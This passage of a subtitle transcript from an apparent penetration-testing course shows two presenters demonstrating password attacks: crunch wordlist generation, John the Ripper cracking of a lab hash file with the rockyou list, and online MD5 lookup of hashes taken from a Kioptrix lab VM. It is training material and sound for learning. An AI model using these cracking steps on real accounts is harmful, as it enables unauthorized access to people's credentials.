--> 00:09:28.430\nyou've probably heard of a tool called\nfind and replace in most text editors.\n\n204\n00:09:28.430 --> 00:09:32.510\nAnd so you go through and you take that\nfile and you replace all a's with @ and\n\n205\n00:09:32.510 --> 00:09:33.530\nsave it as a new file.\n\n206\n00:09:33.530 --> 00:09:35.125\nNow tack it onto the first file,\n\n207\n00:09:35.125 --> 00:09:38.765\nyou've got a second dictionary\nthat has at's instead of a's.\n\n208\n00:09:38.765 --> 00:09:41.175\nSo you're gonna be able\nto find those passwords.\n\n209\n00:09:41.175 --> 00:09:42.245\n&gt;&gt; That's it.\n\n210\n00:09:42.245 --> 00:09:44.565\nSo that's basically dictionary attacking.\n\n211\n00:09:44.565 --> 00:09:48.885\nSo we've got a file, passwords are inside\nof it, it tries those passwords, and\n\n212\n00:09:48.885 --> 00:09:50.355\nsees if they work or not.\n\n213\n00:09:50.355 --> 00:09:53.065\nOkay, that's pretty straight forward,\npretty simple.\n\n214\n00:09:53.065 --> 00:09:54.490\nI like dictionary attacks.\n\n215\n00:09:54.490 --> 00:09:59.200\nThen there's brute force attacks, where\nit says okay we're gonna play a game and\n\n216\n00:09:59.200 --> 00:10:01.075\nit's gonna be called the long wait.\n\n217\n00:10:01.075 --> 00:10:04.090\n&gt;&gt; [LAUGH]\n&gt;&gt; Cuz you tried dictionaries a brute\n\n218\n00:10:04.090 --> 00:10:07.440\nforce attack, that's typically what\nit ends up being, a long wait.\n\n219\n00:10:07.440 --> 00:10:11.480\nBecause what it does is it just tries,\nyou give it a set of characters.\n\n220\n00:10:12.730 --> 00:10:16.220\nThe script or the program, whatever\nit's gonna use to crack it's password.\n\n221\n00:10:16.220 --> 00:10:20.100\nAnd it tries every possible\ncombination of those characters\n\n222\n00:10:20.100 --> 00:10:23.340\nstarting with single characters\nto double characters.\n\n223\n00:10:23.340 --> 00:10:27.570\nSo if I give it six characters, it will\neventually work itself with exponential.\n\n224\n00:10:27.570 --> 00:10:29.380\nContinues to grow, and\n\n225\n00:10:29.380 --> 00:10:33.820\ntrying every possible combination of\nthose characters within that given set.\n\n226\n00:10:33.820 --> 00:10:36.500\nThat as you can imagine\ncan take a very long time.\n\n227\n00:10:36.500 --> 00:10:39.230\nNot even, and it's not guaranteed to work.\n\n228\n00:10:39.230 --> 00:10:43.980\nBecause if you have a sufficiently long\npassword, it will just take too long and\n\n229\n00:10:43.980 --> 00:10:45.670\nthe person will die.\n\n230\n00:10:45.670 --> 00:10:46.953\nWaiting for it to end, right?\n\n231\n00:10:46.953 --> 00:10:48.940\n[LAUGH]\n&gt;&gt; Looking at the scary thing is faster\n\n232\n00:10:48.940 --> 00:10:55.450\ncomputers get the less time it takes to go\nthrough all those possible combinations.\n\n233\n00:10:55.450 --> 00:10:58.730\nI think last time I looked we\nwere dealing with Pentiums,\n\n234\n00:10:58.730 --> 00:11:02.060\nthey were firing off hundreds of\nthousands of guesses per second.\n\n235\n00:11:02.060 --> 00:11:03.680\n&gt;&gt; Right.\n&gt;&gt; Per second, so\n\n236\n00:11:03.680 --> 00:11:06.770\nyou're thinking wow,\nit can go through a lot of guesses.\n\n237\n00:11:06.770 --> 00:11:10.530\nAaa, aab, aac, all the way up.\n\n238\n00:11:10.530 --> 00:11:11.720\nAnd sure, it can take a long time, but\n\n239\n00:11:11.720 --> 00:11:15.198\nnot as long as you might think depending\nagain on how long that password is.\n\n240\n00:11:15.198 --> 00:11:20.140\n&gt;&gt; Yeah, so\nusing a sufficiently long password\n\n241\n00:11:20.140 --> 00:11:23.500\nwill help protect against\na brute force attack.\n\n242\n00:11:23.500 --> 00:11:26.350\nThere's also something called\nkey space brute forcing and\n\n243\n00:11:26.350 --> 00:11:27.960\nthat's kind of on our end as pen testers.\n\n244\n00:11:27.960 --> 00:11:31.400\nWe want to create\nbasically a dictionary file\n\n245\n00:11:31.400 --> 00:11:35.800\nthat has all those possible character\ncombinations inside of it so\n\n246\n00:11:35.800 --> 00:11:38.260\nit's not generating it and\nworking it through that way.\n\n247\n00:11:38.260 --> 00:11:40.840\nIt's easier for it to just read\na file that already has them.\n\n248\n00:11:40.840 --> 00:11:44.400\nThe problem with doing this is creating\nthis file is it can get very large\n\n249\n00:11:44.400 --> 00:11:45.530\nvery quickly, okay?\n\n250\n00:11:45.530 --> 00:11:50.280\nSo, I will warn you really\nagainst doing this.\n\n251\n00:11:50.280 --> 00:11:51.870\nYou need to put some constraints on it.\n\n252\n00:11:51.870 --> 00:11:55.960\nBut I'll show you how to\nuse a tool called crunch so\n\n253\n00:11:55.960 --> 00:11:58.460\nthat you can create this type of file.\n\n254\n00:11:58.460 --> 00:12:00.630\nLet's go ahead and jump in here.\n\n255\n00:12:00.630 --> 00:12:02.190\nLet's run crunch.\n\n256\n00:12:02.190 --> 00:12:06.370\nSo just like it sounds\nno funny speak here.\n\n257\n00:12:06.370 --> 00:12:07.390\nCrunch like that.\n\n258\n00:12:07.390 --> 00:12:12.500\nThen you say what is the minimum length,\nwhat is the maximum length of characters.\n\n259\n00:12:12.500 --> 00:12:14.610\nRight.\nSo I'm gonna keep it small say\n\n260\n00:12:14.610 --> 00:12:16.510\nfour, and four.\n\n261\n00:12:16.510 --> 00:12:17.560\nSo minimum and maximum.\n\n262\n00:12:18.900 --> 00:12:20.760\nIt's gonna be four characters.\n\n263\n00:12:20.760 --> 00:12:23.660\nAnd then I will tell it\nit's a character set.\n\n264\n00:12:23.660 --> 00:12:28.790\nAnd I'll just say 0123456789 and\nend in ABC, just like that.\n\n265\n00:12:28.790 --> 00:12:30.590\nAnd those are capital ABCs not lower abcs.\n\n266\n00:12:30.590 --> 00:12:33.525\nI could throw those in as well but\nI don't want it to get too crazy.\n\n267\n00:12:33.525 --> 00:12:35.850\n-0 for output.\n\n268\n00:12:35.850 --> 00:12:37.780\nWhere do I want to store this file?\n\n269\n00:12:37.780 --> 00:12:44.590\nAnd I'll call it crunchy.txt,\nlike that, and there we go.\n\n270\n00:12:44.590 --> 00:12:48.130\nCranking away, crunch will now\ngenerate the number of lines, and\n\n271\n00:12:48.130 --> 00:12:50.280\nit generated the outputs.\n\n272\n00:12:50.280 --> 00:12:52.980\nSo let's do an ls-al.\n\n273\n00:12:52.980 --> 00:12:54.390\nWe see, where is crunchy?\n\n274\n00:12:54.390 --> 00:12:59.564\nThere it is, and\nlook at the size with four characters.\n\n275\n00:12:59.564 --> 00:13:03.175\nIf I do ALF probably make it a little,\n\n276\n00:13:03.175 --> 00:13:08.484\nyeah why did that not do,\nyou're supposed to work.\n\n277\n00:13:08.484 --> 00:13:10.480\nIt's ALH, I'm an idiot.\n\n278\n00:13:10.480 --> 00:13:11.270\nThere we go.\n\n279\n00:13:11.270 --> 00:13:13.880\nMaybe it's a lower case h.\n\n280\n00:13:13.880 --> 00:13:15.220\nHuman readable man come on.\n\n281\n00:13:15.220 --> 00:13:16.368\nThere we go.\n\n282\n00:13:16.368 --> 00:13:22.050\nSo crunch used a hundred and forty\nkilobytes, at RAM a second, two seconds.\n\n283\n00:13:22.050 --> 00:13:24.270\nIt was very fast, and was on four carries.\n\n284\n00:13:24.270 --> 00:13:28.270\nif I got to six, I go to eight, I start\ngetting to twelve, this becomes gigs and\n\n285\n00:13:28.270 --> 00:13:30.140\nterabytes, very quickly.\n\n286\n00:13:30.140 --> 00:13:31.820\nSo be careful on running crunch.\n\n287\n00:13:31.820 --> 00:13:35.430\n&gt;&gt; It's an exponential growth when\nyou start adding a single character.\n\n288\n00:13:35.430 --> 00:13:37.390\nIt doesn't just double\nthe number of possibilities.\n\n289\n00:13:37.390 --> 00:13:40.630\nIt's an exponential increment\nof number possibilities.\n\n290\n00:13:40.630 --> 00:13:43.280\nSo you get up to eight,\nit's not gonna take double the time.\n\n291\n00:13:43.280 --> 00:13:45.140\nIt's gonna take a lot longer.\n\n292\n00:13:45.140 --> 00:13:47.430\n&gt;&gt; Yeah couple of other options I\nwanna show you about crunch just so\n\n293\n00:13:47.430 --> 00:13:48.730\nthat you're aware of them.\n\n294\n00:13:48.730 --> 00:13:50.700\nLet's open the man page for man crunch.\n\n295\n00:13:52.740 --> 00:13:55.080\nCrunch, there we go.\n\n296\n00:13:55.080 --> 00:13:59.410\nI wanted to show you the -F option,\nwhich is right here.\n\n297\n00:14:00.440 --> 00:14:04.050\nSo you can use a character set,\ninstead of telling it what characters.\n\n298\n00:14:05.060 --> 00:14:09.165\nIn that line you can just say,\nlook to this character set in this file.\n\n299\n00:14:09.165 --> 00:14:13.167\nThis is how it works, -f,\nthen /path to charset, so\n\n300\n00:14:13.167 --> 00:14:16.650\nwherever you keep that\ncharacter set saved at.\n\n301\n00:14:17.770 --> 00:14:20.790\nAnd then it specifies that\ncharacter set from that list.\n\n302\n00:14:20.790 --> 00:14:25.990\nAlso if you look for\n-t option, there we go.\n\n303\n00:14:25.990 --> 00:14:28.580\nThis specifies a pattern.\n\n304\n00:14:28.580 --> 00:14:31.170\nSo working with that mutation, right?\n\n305\n00:14:31.170 --> 00:14:35.987\nIf I want to insert lowercase, so I've\ngot maybe a word list, and you want to\n\n306\n00:14:35.987 --> 00:14:40.731\nchange the first letter to an upper case,\nright, or use a character set and\n\n307\n00:14:40.731 --> 00:14:45.659\nadd the upper case a at the beginning or\nzeros or one, numbers, characters.\n\n308\n00:14:45.659 --> 00:14:49.492\nYou can see if you use an at symbol\nwill insert a lower case character,\n\n309\n00:14:49.492 --> 00:14:54.055\na comma will insert upper case characters,\npercent signs will insert numbers and\n\n310\n00:14:54.055 --> 00:14:56.890\nthe carat will insert\na symbol of some sort.\n\n311\n00:14:56.890 --> 00:14:59.060\nAll right and\nthen you just feed that to it.\n\n312\n00:14:59.060 --> 00:15:00.050\nAnd there you go.\n\n313\n00:15:00.050 --> 00:15:05.100\nSo kind of gives you an example\nright here where that will add\n\n314\n00:15:05.100 --> 00:15:09.470\nlower case characters to the beginning and\nending of that password, okay.\n\n315\n00:15:10.660 --> 00:15:12.700\nSo there we go, couple of options for you.\n\n316\n00:15:12.700 --> 00:15:15.640\nLike I said be careful with crunch,\nI don't want you eating up your entire\n\n317\n00:15:15.640 --> 00:15:19.600\nhard drive cuz you accidentally\nput 46 characters [LAUGH].\n\n318\n00:15:19.600 --> 00:15:22.090\nIt will get a little crazy here.\n\n319\n00:15:22.090 --> 00:15:25.400\nAll right,\nlet's move to some more sophisticated\n\n320\n00:15:25.400 --> 00:15:30.200\npassword attacking tools and\ncracking tools.\n\n321\n00:15:30.200 --> 00:15:31.360\nLet's talk John the Ripper.\n\n322\n00:15:31.360 --> 00:15:35.330\nJohn the Ripper is an oldie but\na goodie, it is still a fan favorite.\n\n323\n00:15:35.330 --> 00:15:37.430\nIt's been around since\nI've started doing this.\n\n324\n00:15:37.430 --> 00:15:40.170\nAnd that was back in 98?\n\n325\n00:15:40.170 --> 00:15:41.530\nSo when I got into like thinking,\n\n326\n00:15:41.530 --> 00:15:45.440\naw I want to be a hacker man, it's\ngoing to be awesome, that was in 1998.\n\n327\n00:15:45.440 --> 00:15:49.787\nI was eighteen, and John the Ripper\nwas already like a tried and\n\n328\n00:15:49.787 --> 00:15:52.668\ntrue staple of every hacker's toolkit.\n\n329\n00:15:52.668 --> 00:15:56.587\nIt still is,\nthat's a testament to it's brand.\n\n330\n00:15:56.587 --> 00:15:58.789\nYou'll want to get familiar with John.\n\n331\n00:15:58.789 --> 00:15:59.400\nLet's do that.\n\n332\n00:15:59.400 --> 00:16:00.477\nLet's get familiar with John.\n\n333\n00:16:00.477 --> 00:16:02.955\nLet's give him my computer here.\n\n334\n00:16:02.955 --> 00:16:06.120\nI do have, I think I made it in this test.\n\n335\n00:16:06.120 --> 00:16:09.960\nLet's look in there.\n\n336\n00:16:09.960 --> 00:16:12.220\nSo I've got user2, or\nstolen_pass, that's it.\n\n337\n00:16:12.220 --> 00:16:13.064\nThat's the one I wanted to see.\n\n338\n00:16:13.064 --> 00:16:15.918\nI've got stolen_pass like cats,\n\n339\n00:16:15.918 --> 00:16:19.290\nstolen_pass there are some\npasswords in here.\n\n340\n00:16:19.290 --> 00:16:22.260\nThere are their hash values, right?\n\n341\n00:16:22.260 --> 00:16:23.180\nJust like this guy right here.\n\n342\n00:16:23.180 --> 00:16:26.070\nIt's one of the, I created so\nI grabbed these passwords.\n\n343\n00:16:26.070 --> 00:16:28.860\nI'll show you how to do\nthat in a little bit.\n\n344\n00:16:28.860 --> 00:16:32.770\nFrom a Windows machine,\nI wanna crack that password right?\n\n345\n00:16:32.770 --> 00:16:33.390\nSo what do I do?\n\n346\n00:16:34.420 --> 00:16:37.669\nI can run it through Johnny boy.\n\n347\n00:16:37.669 --> 00:16:42.154\nWhat you do is you just basically John and\nthen do I wanna do that one,\n\n348\n00:16:42.154 --> 00:16:45.473\nlet me look at these other\nones real quickly here.\n\n349\n00:16:45.473 --> 00:16:49.080\nLet me cats user 2 cuz I\nwanted to play with them.\n\n350\n00:16:49.080 --> 00:16:51.520\nNo it's the same file,\nokay that's what I did.\n\n351\n00:16:52.700 --> 00:16:56.628\nSo let's do it, John, and\nthen just whatever that file is.\n\n352\n00:16:56.628 --> 00:16:59.620\nI'll do stolenpass.TXT.\n\n353\n00:16:59.620 --> 00:17:03.450\nSo It's cranking away, it says two\npasswords loaded into the hash,\n\n354\n00:17:03.450 --> 00:17:06.070\nremaining one password hash,\nand it's looking for that.\n\n355\n00:17:06.070 --> 00:17:09.910\nIt's basically trying to\nbrute force that system.\n\n356\n00:17:09.910 --> 00:17:14.930\nI could sit here an let it crack away\nuntil it finds what that password is,\n\n357\n00:17:14.930 --> 00:17:16.110\nthat could take a while.\n\n358\n00:17:16.110 --> 00:17:17.320\nMaybe it wont, maybe it will.\n\n359\n00:17:17.320 --> 00:17:18.190\nI don't wanna wait for it,\n\n360\n00:17:18.190 --> 00:17:21.820\nI just wanna show that's basically\nthat's how you work John.\n\n361\n00:17:21.820 --> 00:17:23.570\nJust the very lowest level.\n\n362\n00:17:23.570 --> 00:17:25.146\nAt it's core, it's a brute force.\n\n363\n00:17:25.146 --> 00:17:31.200\nBut it will run word files and\ndo dictionary attacks as well.\n\n364\n00:17:32.550 --> 00:17:35.970\nSo if I have a word list\nI can throw that at it.\n\n365\n00:17:35.970 --> 00:17:37.150\nI do have a word list.\n\n366\n00:17:37.150 --> 00:17:39.550\nI do have RockU so let me see here.\n\n367\n00:17:39.550 --> 00:17:41.688\nDo I have RockU here.\n\n368\n00:17:41.688 --> 00:17:45.690\nNo let me locate.\n\n369\n00:17:45.690 --> 00:17:47.810\nIt's in the previous directory.\n\n370\n00:17:47.810 --> 00:17:48.950\nSo I'll know that's there.\n\n371\n00:17:48.950 --> 00:17:52.660\nSo John, basically the same command,\nstolen_pass.text.\n\n372\n00:17:52.660 --> 00:17:59.170\nBut some will say wordList like that\nequals whatever my word list is.\n\n373\n00:17:59.170 --> 00:18:05.921\nSo I can say, give it the path\nto that wordList/root/attack,\n\n374\n00:18:05.921 --> 00:18:09.790\nof course I can't spell it out.\n\n375\n00:18:09.790 --> 00:18:14.360\nWhat does that say, let me just\ncopy it into here, it'll be easier.\n\n376\n00:18:14.360 --> 00:18:20.408\nCp let me go back, do I have one in here.\n\n377\n00:18:20.408 --> 00:18:25.676\n[SOUND] No hashes is there a hash, just\nlooking to see if there's a hash in here.\n\n378\n00:18:25.676 --> 00:18:28.245\nMaybe that two hash cat two hash.\n\n379\n00:18:30.212 --> 00:18:32.100\nYeah, that's good.\n\n380\n00:18:32.100 --> 00:18:33.154\nThat will work.\nSo we'll do it here.\n\n381\n00:18:33.154 --> 00:18:37.203\nJohn, Stone.\n\n382\n00:18:37.203 --> 00:18:38.920\nWell that's two hash now.\n\n383\n00:18:38.920 --> 00:18:40.652\nCome on now, [INAUDIBLE].\n\n384\n00:18:40.652 --> 00:18:41.240\n&gt;&gt; Mm-hm.\n\n385\n00:18:41.240 --> 00:18:42.612\n&gt;&gt; Two hash, a text, dash.\n\n386\n00:18:42.612 --> 00:18:47.130\nThere's dashes here.\n\n387\n00:18:47.130 --> 00:18:54.322\nDash word file =rockyou, Space?\n\n388\n00:18:54.322 --> 00:18:57.820\nNo, just rockyou.txt.\n\n389\n00:18:57.820 --> 00:19:01.144\nAnd that should crank\naway to Unknown option.\n\n390\n00:19:01.144 --> 00:19:07.120\nwordfile=, what am I doing on here?\n\n391\n00:19:07.120 --> 00:19:07.950\nIt's wordlist, yeah.\n\n392\n00:19:09.780 --> 00:19:11.250\nThat's my problem.\n\n393\n00:19:11.250 --> 00:19:13.240\nThat's your problem right there Lowrie.\n\n394\n00:19:13.240 --> 00:19:16.980\nThere we go,\nload to passwords and it's done.\n\n395\n00:19:16.980 --> 00:19:23.400\nOnce it's done you can\ndo the john -show and\n\n396\n00:19:23.400 --> 00:19:28.014\nthen tell it what password file you\nwanna do, which is twohash.txt.\n\n397\n00:19:29.900 --> 00:19:32.250\nAnd let's say, three passwords correct.\n\n398\n00:19:32.250 --> 00:19:34.650\nLook at that here's\nthe password right there.\n\n399\n00:19:34.650 --> 00:19:35.510\nPassword 1.\n\n400\n00:19:35.510 --> 00:19:38.950\nSo once it cracks the password\nyou do the dash so option so\n\n401\n00:19:38.950 --> 00:19:40.900\nyou can see what the password is.\n\n402\n00:19:40.900 --> 00:19:44.810\nTypically, since I've already cracked\nthis password it doesn't output it.\n\n403\n00:19:44.810 --> 00:19:46.940\nOnly does it the first time you crack it.\n\n404\n00:19:46.940 --> 00:19:49.350\nEvery other time you have to\nuse the show option to see it.\n\n405\n00:19:49.350 --> 00:19:50.590\nBut the first time you actually break it,\n\n406\n00:19:50.590 --> 00:19:55.390\nit will output it to the screen and\nthat's what it will look like.\n\n407\n00:19:55.390 --> 00:19:59.360\nAll right.\nSo John will also work with mutations.\n\n408\n00:19:59.360 --> 00:20:00.610\nLet's take a look at that.\n\n409\n00:20:00.610 --> 00:20:07.772\nThere is a few cat/etsy/john/john.com.\n\n410\n00:20:07.772 --> 00:20:10.504\nThere is, did I cat it?\n\n411\n00:20:10.504 --> 00:20:12.634\nYeah, I want to open that.\n\n412\n00:20:12.634 --> 00:20:16.280\nN-N-O or let's list it.\n\n413\n00:20:16.280 --> 00:20:17.120\nThere we go.\n\n414\n00:20:17.120 --> 00:20:19.630\nNow we can kind of look through it.\n\n415\n00:20:19.630 --> 00:20:22.750\nThere's the configuration\nfile down in here.\n\n416\n00:20:24.180 --> 00:20:28.040\nThere is areas where you\ncan setup mutations.\n\n417\n00:20:28.040 --> 00:20:30.630\nI know that I think I have to search for\n\n418\n00:20:30.630 --> 00:20:35.990\na string to get you to certain\nspots cuz it's a big file.\n\n419\n00:20:35.990 --> 00:20:36.740\nIt's a big file.\n\n420\n00:20:36.740 --> 00:20:38.430\n&gt;&gt; A lot of cool options in there.\n\n421\n00:20:38.430 --> 00:20:41.440\nSome that are common that you can just\nuncomment to enable those things.\n\n422\n00:20:41.440 --> 00:20:44.800\n&gt;&gt; Yeah, you can kinda see that right\nhere like global build options for\n\n423\n00:20:44.800 --> 00:20:46.190\nmy specific build options.\n\n424\n00:20:46.190 --> 00:20:50.030\nMay be concatenated to this and\nthen if so this is obviously working, but\n\n425\n00:20:50.030 --> 00:20:53.570\nif I wanted to do this for\nNvidia SM 30 and beyond.\n\n426\n00:20:53.570 --> 00:20:56.760\nJava is an extremely powerful\ntool to be honest with you, but\n\n427\n00:20:56.760 --> 00:21:01.670\nwhat's cool is you can add\nyour own rule set to it,\n\n428\n00:21:01.670 --> 00:21:05.210\nso if you wanted to work with a certain\ntype of mutation you could create that.\n\n429\n00:21:05.210 --> 00:21:09.590\nI'll show you a web site\nthat I found had great\n\n430\n00:21:09.590 --> 00:21:12.340\npre built stuff that you\njust add it to the file.\n\n431\n00:21:12.340 --> 00:21:15.616\n&gt;&gt; Nice.\n&gt;&gt; You just drag and drop copy and\n\n432\n00:21:15.616 --> 00:21:22.246\npaste it into the file and\nthen you call it when you run John and\n\n433\n00:21:22.246 --> 00:21:27.446\nit works great and\nI'll show you where that is,\n\n434\n00:21:27.446 --> 00:21:30.826\nthey give a great write up which\n\n435\n00:21:30.826 --> 00:21:37.298\nis\nhttps://www.gracefulsecurity.com/custom-r-\n\n436\n00:21:37.298 --> 00:21:41.247\nules-for-john-the-ripper.\n\n437\n00:21:41.247 --> 00:21:42.942\n&gt;&gt; Check for, you might have missed an r.\n\n438\n00:21:42.942 --> 00:21:46.560\n&gt;&gt; Yeah, I did, but it took me anyway.\n\n439\n00:21:46.560 --> 00:21:48.182\nKeep that in there, there we go.\n\n440\n00:21:50.415 --> 00:21:53.150\nStill didn't spell correctly but\nit's in here somewhere.\n\n441\n00:21:53.150 --> 00:21:53.650\n&gt;&gt; Over there.\n\n442\n00:21:54.730 --> 00:21:56.190\n&gt;&gt; Thank you Michael.\n\n443\n00:21:56.190 --> 00:21:57.970\nI'm a horrible typer\nsince you guys can tell.\n\n444\n00:21:59.250 --> 00:21:59.780\nThere we go.\n\n445\n00:21:59.780 --> 00:22:04.240\nCustom rules for John the Ripper,\nand here's how to insert them,\n\n446\n00:22:04.240 --> 00:22:08.550\nwhat they look like, very simple one\nthat you can do and how to call them.\n\n447\n00:22:08.550 --> 00:22:10.860\nYou go to the second page\nthat's down here at the bottom,\n\n448\n00:22:10.860 --> 00:22:12.290\nit gets a little more complex.\n\n449\n00:22:13.460 --> 00:22:16.390\nYou don't necessarily need to\nknow the ins and outs of this but\n\n450\n00:22:16.390 --> 00:22:19.880\nif you want to you can just read\nthe John man page and everything.\n\n451\n00:22:19.880 --> 00:22:20.830\n&gt;&gt; Hey that's a huge help.\n\n452\n00:22:20.830 --> 00:22:26.130\nAny time you can limit the number of\ncharacters that you're using you can\n\n453\n00:22:26.130 --> 00:22:29.600\ndramatically cut the time it's gonna\ntake to crack those passwords.\n\n454\n00:22:29.600 --> 00:22:31.260\nThat's where social engineering,\n\n455\n00:22:31.260 --> 00:22:36.690\ndoing that initial foot printing about\nthe organization comes into play.\n\n456\n00:22:36.690 --> 00:22:40.220\nBecause if I know that your\npassword policy is only letters and\n\n457\n00:22:40.220 --> 00:22:43.680\nnumbers, I can leave\nout special characters.\n\n458\n00:22:43.680 --> 00:22:47.070\nThat's 32 characters,\npossibilities per character,\n\n459\n00:22:47.070 --> 00:22:50.790\nthat I can leave out that my brute\nforcer now doesn't have to try.\n\n460\n00:22:50.790 --> 00:22:53.930\nSo now we talked about adding a character\nraises the number of possibilities\n\n461\n00:22:53.930 --> 00:22:55.160\nexponentially.\n\n462\n00:22:55.160 --> 00:22:58.230\nWell reducing character sets\ndoes just the opposite.\n\n463\n00:22:58.230 --> 00:23:01.540\nAnd so I can take something that\nmight have taken 10,000 years,\n\n464\n00:23:01.540 --> 00:23:04.400\nmaybe I can bring that down to\nsomething a little more reasonable.\n\n465\n00:23:05.410 --> 00:23:07.295\n&gt;&gt; Exactly right, Mike makes great points.\n\n466\n00:23:07.295 --> 00:23:09.361\nDo hear me he is a smart, smart man.\n\n467\n00:23:09.361 --> 00:23:13.783\nAll right so, kind of the ins and outs of\nJohn, you do wanna get a grasp of that,\n\n468\n00:23:13.783 --> 00:23:17.749\ngiving you the basic services so\nthat you can springboard from there.\n\n469\n00:23:17.749 --> 00:23:20.423\nMan pages are our friends ladies and\ngentlemen but\n\n470\n00:23:20.423 --> 00:23:22.975\nit's not too difficult\nonce you figure it out.\n\n471\n00:23:22.975 --> 00:23:26.475\nThat's not the only game in town,\nthere's others in\n\n472\n00:23:26.475 --> 00:23:30.870\nif you go into the applications\nthere's a password attacks area.\n\n473\n00:23:30.870 --> 00:23:31.880\nYou'll notice there's John.\n\n474\n00:23:31.880 --> 00:23:35.300\nJohnnie is the frontend GUI for\nJohn the Ripper, so\n\n475\n00:23:35.300 --> 00:23:37.510\nthat's nice to know that's there.\n\n476\n00:23:37.510 --> 00:23:41.090\nIncracked, ophcracked, yeah I guess\nit's ophcracked or offcracked.\n\n477\n00:23:41.090 --> 00:23:42.760\n&gt;&gt; I call it offcracked, but\nI don't know if that's right.\n\n478\n00:23:42.760 --> 00:23:43.670\n&gt;&gt; Yeah, something like that.\n\n479\n00:23:43.670 --> 00:23:47.810\nIt's basically derivation of L0phtCrack,\nwhich is now a pay service.\n\n480\n00:23:47.810 --> 00:23:50.092\nIt used to be free,\nyou could download it, it was awesome.\n\n481\n00:23:50.092 --> 00:23:52.676\nThen they started saying hey you know\nwe've got a great tool here we should\n\n482\n00:23:52.676 --> 00:23:53.644\ncharge money for it [LAUGH].\n\n483\n00:23:53.644 --> 00:23:58.016\nBut then off cracked came out and\nyou can use that just click on that.\n\n484\n00:23:58.016 --> 00:24:03.051\nAnd then you go you load in your hashes,\nyou load in your tables,\n\n485\n00:24:03.051 --> 00:24:06.960\nand you hit crack and\noff you go right very cool.\n\n486\n00:24:06.960 --> 00:24:09.600\nAnother one here I think was just\n\n487\n00:24:09.600 --> 00:24:14.440\nworth mentioning password\nattacks password attacks.\n\n488\n00:24:14.440 --> 00:24:19.370\nRainbow tables basically a huge tables\nthat have been prebuilt,that you\n\n489\n00:24:19.370 --> 00:24:21.448\ncan telnet if you go the space.\n\n490\n00:24:21.448 --> 00:24:22.060\n[LAUGH].\n\n491\n00:24:22.060 --> 00:24:22.643\n&gt;&gt; Yeah.\n&gt;&gt; But\n\n492\n00:24:22.643 --> 00:24:27.098\nonline services will provide them for\nyou, just go on and look for\n\n493\n00:24:27.098 --> 00:24:32.449\nrainbow tables online password cracking\nutilities that will do this for you.\n\n494\n00:24:32.449 --> 00:24:37.290\nYou just drag and drop your hash,put\nit in there,they are pre-run.\n\n495\n00:24:37.290 --> 00:24:40.250\nHashing algorithms, looking for the same.\n\n496\n00:24:40.250 --> 00:24:43.040\nSo if your hash string is xyz,\n\n497\n00:24:43.040 --> 00:24:47.940\nit's found every permutation that\ncomes up with xyz as its hash output.\n\n498\n00:24:47.940 --> 00:24:50.900\nAnd it can run through\nit extremely quickly.\n\n499\n00:24:50.900 --> 00:24:53.460\nReducing the amount of time it takes for\nyou to do that.\n\n500\n00:24:53.460 --> 00:24:56.090\nAnd I can show you something like that.\n\n501\n00:24:56.090 --> 00:24:59.339\nLet me so, let's do this.\n\n502\n00:24:59.339 --> 00:25:02.701\nLet me go back into here, let me cd and\n\n503\n00:25:02.701 --> 00:25:07.480\ncd into Kioptrics cuz I know\nwe grabbed those creds.\n\n504\n00:25:07.480 --> 00:25:11.662\nLet me cat creds.\n\n505\n00:25:11.662 --> 00:25:14.739\nAnd we've got these hashes.\n\n506\n00:25:14.739 --> 00:25:17.470\nSo I'm gonna grab that, copy.\n\n507\n00:25:18.920 --> 00:25:22.550\nI'll go out to the Internet.\n\n508\n00:25:22.550 --> 00:25:27.790\nConnect, open my browser and\n\n509\n00:25:27.790 --> 00:25:32.510\nI've got this cool\nMD5 Online site right here.\n\n510\n00:25:32.510 --> 00:25:34.030\nI just drop that.\n\n511\n00:25:34.030 --> 00:25:34.530\nPaste.\n\n512\n00:25:36.889 --> 00:25:40.743\nType in my CAPTCHA,\nwhich is lidless it looks like.\n\n513\n00:25:40.743 --> 00:25:44.360\nHit decrypt, and we're done.\n\n514\n00:25:45.860 --> 00:25:47.830\nSo that's a fun way to crack passwords,\nright?\n\n515\n00:25:47.830 --> 00:25:49.645\nOnline, just go and do it online.\n\n516\n00:25:49.645 --> 00:25:50.270\n&gt;&gt; [LAUGH]\n&gt;&gt; So\n\n517\n00:25:50.270 --> 00:25:53.650\nif you don't have the tool installed\nas long as you can grab that,\n\n518\n00:25:53.650 --> 00:25:55.990\nif you had to manually type it in.\n\n519\n00:25:55.990 --> 00:25:56.770\nI know, that's a pain.\n\n520\n00:25:56.770 --> 00:25:59.640\nBut you can type it in, I've had to do it.\n\n521\n00:25:59.640 --> 00:26:01.010\nBecause I couldn't care,this was in a VM.\n\n522\n00:26:01.010 --> 00:26:03.840\nIt was locked down,\nI couldn't do it, had to type it in.\n\n523\n00:26:03.840 --> 00:26:07.760\nAnd there you go they'll crack that for\nyou cuz it's already been cracked.\n\n524\n00:26:07.760 --> 00:26:11.365\n&gt;&gt; Yeah, that's the thing a lot of people,\nmaybe are confused with that.\n\n525\n00:26:11.365 --> 00:26:14.952\nYou know when you look at a rainbow table,\npasswords are stored as hashes.\n\n526\n00:26:14.952 --> 00:26:18.815\nHashes are fixed length, which means\nno matter what you put into it,\n\n527\n00:26:18.815 --> 00:26:23.690\ntwo characters or 2,500 characters,\nthey always come out with the same Length.\n\n528\n00:26:23.690 --> 00:26:26.850\nThe hash value always has\nthe same number of characters.\n\n529\n00:26:26.850 --> 00:26:28.670\nSo what that means is we get collisions.\n\n530\n00:26:28.670 --> 00:26:32.390\nThe smaller that space is, the fewer\ncharacters of that hashing algorithm\n\n531\n00:26:32.390 --> 00:26:34.440\noutputs, the more collisions we have.\n\n532\n00:26:34.440 --> 00:26:37.670\nThat means more than one thing\nthat are fed into the algorithm,\n\n533\n00:26:37.670 --> 00:26:40.190\ncan end up generating the same hash value.\n\n534\n00:26:40.190 --> 00:26:44.660\nAnd what people sometimes forget is I\ndon't need to know what your password is.\n\n535\n00:26:44.660 --> 00:26:49.980\nI need to know something that generates\nthe same hash value as your password does,\n\n536\n00:26:49.980 --> 00:26:53.370\nbecause as long as it generates that hash\nvalue that's what gets sent over and\n\n537\n00:26:53.370 --> 00:26:56.660\ncompared in whatever security\ndatabase you're using to authenticate\n\n538\n00:26:56.660 --> 00:26:57.980\nlike Active Directory.\n\n539\n00:26:57.980 --> 00:27:01.940\nSo these rainbow tables as Daniel\nsaid just taking hundreds of\n\n540\n00:27:01.940 --> 00:27:05.440\nthousands of millions of words,\nrun them through these hashing algorithms,\n\n541\n00:27:05.440 --> 00:27:09.290\ngenerated their output, you tell them hey,\nhere's the output that my password 